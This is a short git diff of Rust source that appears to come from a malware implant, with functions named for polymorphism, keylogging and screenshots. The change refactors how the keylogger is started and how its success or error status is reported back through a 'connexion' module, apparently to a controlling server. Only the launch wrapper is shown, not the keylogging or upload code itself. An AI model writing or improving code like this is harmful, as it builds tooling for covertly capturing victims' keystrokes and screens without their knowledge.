@@ -104,18 +104,11 @@ pub fn init_polymorph_functions() {
 
 async fn keylogger_wrapper(alias: String) {
     println!("[{}] Démarrage du keylogger...", alias);
-    input::init_keylogger_flag();
-    tokio::spawn(async move {
-        match input::start_keylogger(10).await {
-            Ok(_) => {
-                let _ = connexion::send_directive_status("keylogger", "success", "Terminé").await;
-            }
-            Err(e) => {
-                let _ =
-                    connexion::send_directive_status("keylogger", "error", &e.to_string()).await;
-            }
-        }
-    });
+
+    if let Err(e) = input::start_keylogger(10).await {
+        let _ = connexion::send_directive_status("keylogger", "error", &e.to_string()).await;
+    }
+
 }
 
 async fn screenshot_wrapper(alias: String) {
